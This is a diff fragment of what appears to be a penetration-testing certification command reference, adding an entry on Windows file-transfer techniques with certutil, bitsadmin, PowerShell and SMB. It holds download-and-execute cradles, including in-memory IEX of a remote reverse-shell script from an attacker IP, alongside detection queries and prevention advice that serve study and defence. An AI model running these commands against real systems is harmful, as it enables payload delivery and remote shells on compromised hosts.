+      "notes": "=== CERTUTIL ===\n  certutil -urlcache -split -f http://<ip>/<file> C:\\temp\\<file>\n  # Base64 decode:\n  certutil -decode encoded.txt decoded.exe\n  # Encode for transfer:\n  certutil -encode payload.exe encoded.txt\n\n=== BITSADMIN ===\n  bitsadmin /transfer job /download /priority high http://<ip>/<file> C:\\temp\\<file>\n  # Background transfer (stealthier):\n  bitsadmin /create job1\n  bitsadmin /addfile job1 http://<ip>/<file> C:\\temp\\<file>\n  bitsadmin /resume job1\n  bitsadmin /complete job1\n\n=== POWERSHELL ===\n  # Invoke-WebRequest (iwr):\n  iwr http://<ip>/<file> -OutFile C:\\temp\\<file>\n  # WebClient:\n  (New-Object Net.WebClient).DownloadFile(\"http://<ip>/<file>\",\"C:\\temp\\<file>\")\n  # DownloadString (in-memory):\n  IEX(New-Object Net.WebClient).DownloadString(\"http://<ip>/script.ps1\")\n  # Invoke-Expression shorthand:\n  iex(iwr http://<ip>/script.ps1 -UseBasicParsing)\n  # Base64 encoded command:\n  powershell -enc <base64_payload>\n\n=== SMB TRANSFER ===\n  # On attacker (start SMB share):\n  impacket-smbserver share . -smb2support\n  # On target:\n  copy \\\\<ip>\\share\\<file> C:\\temp\\<file>\n  # With credentials:\n  net use \\\\<ip>\\share /user:anyone password\n\n=== WGET (if available) ===\n  wget http://<ip>/<file> -O C:\\temp\\<file>\n  curl http://<ip>/<file> -o C:\\temp\\<file>",
+      "examples": [
+        {
+          "label": "Download with certutil",
+          "command": "certutil -urlcache -split -f http://10.10.14.5/nc.exe C:\\temp\\nc.exe"
+        },
+        {
+          "label": "Download with PowerShell",
+          "command": "iwr http://10.10.14.5/shell.exe -OutFile C:\\temp\\shell.exe"
+        },
+        {
+          "label": "In-memory PowerShell execution",
+          "command": "IEX(New-Object Net.WebClient).DownloadString(\"http://10.10.14.5/Invoke-PowerShellTcp.ps1\")"
+        }
+      ],
+      "references": [
+        {
+          "title": "LOLBAS Project",
+          "url": "https://lolbas-project.github.io/"
+        },
+        {
+          "title": "MITRE T1105",
+          "url": "https://attack.mitre.org/techniques/T1105/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "nix-download",
+          "note": "Linux file transfer methods (wget, curl, nc, python).",
+          "rel": "alternative"
+        },
+        {
+          "id": "lolbins-transfer",
+          "note": "Additional LOLBin transfer techniques.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "These are legitimate Windows utilities repurposed for file transfer. certutil is a certificate management tool, bitsadmin manages Background Intelligent Transfer, and PowerShell is a system shell.",
+        "prerequisites": "Command execution on target; outbound HTTP/SMB access.",
+        "impact": "Download of attacker tools, payloads, and scripts to compromised host.",
+        "detection": "[MITRE T1105] certutil with -urlcache flag; bitsadmin download jobs; PowerShell download cradles.",
+        "artifacts": "certutil URL cache entries; BITS job history; PowerShell script block logs; downloaded files.",
+        "splunk_spl": "index=windows EventCode=4688 (CommandLine=\"*certutil*urlcache*\" OR CommandLine=\"*bitsadmin*transfer*\" OR CommandLine=\"*DownloadFile*\" OR CommandLine=\"*DownloadString*\" OR CommandLine=\"*Invoke-WebRequest*\")\n| table _time, SubjectUserName, NewProcessName, CommandLine",
+        "elastic_kql": "process.args:(*urlcache* OR *bitsadmin* OR *DownloadFile* OR *DownloadString*)",
+        "sentinel_kql": "DeviceProcessEvents\n| where ProcessCommandLine has_any (\"urlcache\", \"bitsadmin /transfer\", \"DownloadFile\", \"DownloadString\", \"Invoke-WebRequest\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine",
+        "sigma_rules": "win_process_creation_lolbin_file_download",
+        "prevention": "AppLocker/WDAC to restrict certutil and bitsadmin; PowerShell Constrained Language Mode; script block logging; proxy filtering.",
+        "sources": [
+          "LOLBAS",
+          "https://attack.mitre.org/techniques/T1105/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "LOLBin file download - certutil/bitsadmin/PowerShell",
+            "logic": "DeviceProcessEvents\n| where (FileName == \"certutil.exe\" and ProcessCommandLine has \"urlcache\")\n  or (FileName == \"bitsadmin.exe\" and ProcessCommandLine has_any (\"transfer\", \"addfile\"))\n  or (ProcessCommandLine has_any (\"DownloadFile\", \"DownloadString\", \"Invoke-WebRequest\") and ProcessCommandLine has \"http\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine",
+            "data_source": "defender-endpoint",
+            "attack": [
+              "T1105"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Legitimate software updates via certutil; SCCM BITS transfers; admin PowerShell scripts",
+            "tuning": "Focus on downloads from external IPs; correlate with new process execution after download"
+          }
+        ]
+      }
+    },
+    {
       "id": "cdsa-m13-windows-artifacts",
       "name": "Windows Forensic Artifacts - NTFS, Execution, Persistence & Zone.Identifier",
       "command": "MFTECmd.exe -f $MFT --csv C:\\output --csvf mft.csv",
@@ -186365,8 +186941,8 @@ const COMMAND_DATA = {
       }
     }
   ],
-  "totalCommands": 1041,
-  "buildDate": "2026-11-10T14:07:44.663Z",
+  "totalCommands": 1047,
+  "buildDate": "2026-11-10T14:11:34.576Z",
   "certifications": [
     "CDSA",
     "CPTS",
